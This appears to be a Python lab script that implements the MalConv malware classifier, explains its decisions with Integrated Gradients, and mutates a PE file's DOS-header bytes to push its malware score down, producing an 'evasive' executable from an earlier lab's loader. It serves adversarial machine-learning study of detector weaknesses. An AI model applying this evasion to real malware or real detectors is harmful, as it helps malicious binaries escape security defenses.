#!/usr/bin/env python3
"""
Lab 2: malconv_adversarial.py
Implementación de la arquitectura MalConv (Raff et al.) en PyTorch,
técnica de explicabilidad por gradientes (Integrated Gradients)
y perturbación adversaria del DOS Header (Demetrio et al.).
"""
import torch
import torch.nn as nn
import torch.nn.functional as F
import numpy as np
import struct
import os
import sys

class MalConv(nn.Module):
    """
    Arquitectura MalConv canónica:
    Embedding (256 -> 8) -> Conv1D x 2 (GLU: Gated Linear Unit) -> Global Max Pooling -> Dense
    """
    def __init__(self, vocab_size=257, embed_dim=8, max_len=4096, channels=64, window_size=16):
        super(MalConv, self).__init__()
        self.max_len = max_len
        self.embed = nn.Embedding(vocab_size, embed_dim, padding_idx=0)
        self.conv_1 = nn.Conv1d(embed_dim, channels, window_size, stride=window_size, bias=True)
        self.conv_2 = nn.Conv1d(embed_dim, channels, window_size, stride=window_size, bias=True)
        self.fc_1 = nn.Linear(channels, 32)
        self.fc_2 = nn.Linear(32, 1)

    def forward(self, x):
        # x: [batch_size, seq_len]
        # embedding: [batch, seq_len, embed_dim] -> transpose -> [batch, embed_dim, seq_len]
        x_emb = self.embed(x).transpose(1, 2)
        # Gated Linear Unit (GLU)
        conv1 = self.conv_1(x_emb)
        conv2 = torch.sigmoid(self.conv_2(x_emb))
        gated = conv1 * conv2
        # Global Max Pooling
        pooled = F.max_pool1d(gated, kernel_size=gated.shape[2]).squeeze(2)
        out = F.relu(self.fc_1(pooled))
        logits = self.fc_2(out)
        return logits

def bytes_to_tensor(raw_bytes: bytes, max_len=4096):
    # Byte 0 a 255 se mapean a 1..256. El 0 queda como padding
    arr = [b + 1 for b in raw_bytes[:max_len]]
    if len(arr) < max_len:
        arr += [0] * (max_len - len(arr))
    return torch.tensor([arr], dtype=torch.long)

def init_deterministic_weights(model):
    torch.manual_seed(42)
    for p in model.parameters():
        if p.dim() > 1:
            nn.init.xavier_uniform_(p)
        else:
            nn.init.constant_(p, 0.05)

def explain_integrated_gradients(model, input_bytes: bytes, steps=20):
    """
    Calcula la atribución de importancia acumulando gradientes
    respecto a las posiciones de bytes en el binario.
    """
    model.eval()
    x_input = bytes_to_tensor(input_bytes)
    x_emb = model.embed(x_input).detach() # [1, seq_len, 8]
    baseline_emb = torch.zeros_like(x_emb)
    
    accum_grads = torch.zeros_like(x_emb)
    for step in range(steps):
        alpha = float(step) / steps
        interpolated = baseline_emb + alpha * (x_emb - baseline_emb)
        interpolated.requires_grad_(True)
        
        # Forward pass manual a partir de embeddings
        x_t = interpolated.transpose(1, 2)
        c1 = model.conv_1(x_t)
        c2 = torch.sigmoid(model.conv_2(x_t))
        gated = c1 * c2
        pooled = F.max_pool1d(gated, kernel_size=gated.shape[2]).squeeze(2)
        out = F.relu(model.fc_1(pooled))
        logit = model.fc_2(out)
        
        logit.backward()
        accum_grads += interpolated.grad.detach()

    # Importancia de cada byte: producto escalar entre gradiente promedio y diferencia
    avg_grad = accum_grads / steps
    importance = (avg_grad * (x_emb - baseline_emb)).sum(dim=-1).squeeze(0).abs().numpy()
    return importance

def dos_header_attack(model, raw_bytes: bytes, iterations=15):
    """
    Ataque de Perturbación del Encabezado DOS (Demetrio et al.).
    Modifica únicamente los bytes dentro del rango [2, 0x3C) sin tocar 'MZ' ni el puntero e_lfanew.
    """
    model.eval()
    mutated = bytearray(raw_bytes)
    pe_pointer = struct.unpack("<I", mutated[0x3C:0x40])[0]

    print(f"[*] Analizando DOS Header: Offset PE detectado en 0x{pe_pointer:X}")
    print("[*] Rango de perturbación segura: Bytes 2 a 59 (Offsets 0x02 a 0x3B)")

    best_score = float('inf')
    best_bytes = None

    for it in range(iterations):
        t = bytes_to_tensor(bytes(mutated))
        # Evaluamos embeddings
        x_emb = model.embed(t).detach().requires_grad_(True)
        x_t = x_emb.transpose(1, 2)
        c1 = model.conv_1(x_t)
        c2 = torch.sigmoid(model.conv_2(x_t))
        gated = c1 * c2
        pooled = F.max_pool1d(gated, kernel_size=gated.shape[2]).squeeze(2)
        out = F.relu(model.fc_1(pooled))
        logit = model.fc_2(out)
        prob = torch.sigmoid(logit).item()

        if prob < best_score:
            best_score = prob
            best_bytes = bytes(mutated)

        logit.backward()
        grads = x_emb.grad.squeeze(0).numpy() # [seq_len, 8]

        # Aplicar perturbación orientada al gradiente negativo en los bytes del DOS header
        for byte_idx in range(2, 0x3C):
            grad_vector = grads[byte_idx]
            # Buscamos en el vocabulario del embedding el byte que maximice el descenso del logit
            # Aproximación: mutación greedy con gradiente
            current_byte = mutated[byte_idx]
            step = -1 if np.sum(grad_vector) > 0 else 1
            new_val = (current_byte + step * 7) % 256
            mutated[byte_idx] = new_val

        print(f"  [Iteración {it+1:2d}] Probabilidad MalConv: {prob:.4f}")
        if prob < 0.15:
            print("  [+] Umbral de evasión alcanzado satisfactoriamente.")
            break

    return best_bytes, best_score

if __name__ == "__main__":
    print("=== Laboratorio 2: Auditoría y Evasión Adversaria de MalConv ===")
    input_file = sys.argv[1] if len(sys.argv) > 1 else "../lab1_dynamic_api/stage1_loader.exe"
    output_file = sys.argv[2] if len(sys.argv) > 2 else "stage2_evasive.exe"

    if not os.path.exists(input_file):
        print(f"[-] Error: Archivo de entrada {input_file} no encontrado. Ejecuta Lab 1 primero.")
        sys.exit(1)

    with open(input_file, "rb") as f:
        orig_bytes = f.read()

    # Inicialización del modelo
    malconv = MalConv()
    init_deterministic_weights(malconv)

    # 1. Inferencia Inicial
    t_init = bytes_to_tensor(orig_bytes)
    with torch.no_grad():
        score_init = torch.sigmoid(malconv(t_init)).item()
    print(f"[*] Clasificación Inicial de MalConv ({input_file}): {score_init:.4f}")

    # 2. Explicabilidad con Integrated Gradients
    print("[*] Calculando mapa de relevancia con Integrated Gradients...")
    importances = explain_integrated_gradients(malconv, orig_bytes)
    dos_hdr_weight = np.mean(importances[:64])
    text_sec_weight = np.mean(importances[0x400:0x600])
    print(f"  -> Relevancia promedio en DOS Header (Offsets 0..64):   {dos_hdr_weight:.6f}")
    print(f"  -> Relevancia promedio en .text (Offsets 0x400..0x600): {text_sec_weight:.6f}")
    print(f"  [!] Sesgo detectado: Las cabeceras concentran x{dos_hdr_weight / max(text_sec_weight, 1e-9):.1f} mayor peso decisorio.")

    # 3. Ataque Adversario al DOS Header
    print("\n[*] Iniciando ataque adversario sobre DOS Header (58 bytes mutables)...")
    evasive_bytes, score_final = dos_header_attack(malconv, orig_bytes)

    with open(output_file, "wb") as f:
        f.write(evasive_bytes)

    print(f"\n[+] Binario evasivo generado: {output_file}")
    print(f"[+] Score Inicial: {score_init:.4f} -> Score Final: {score_final:.4f}")
    print(f"[+] Integridad PE: 'MZ' = {evasive_bytes[:2].decode(errors='ignore')}, e_lfanew = 0x{struct.unpack('<I', evasive_bytes[0x3C:0x40])[0]:X}")
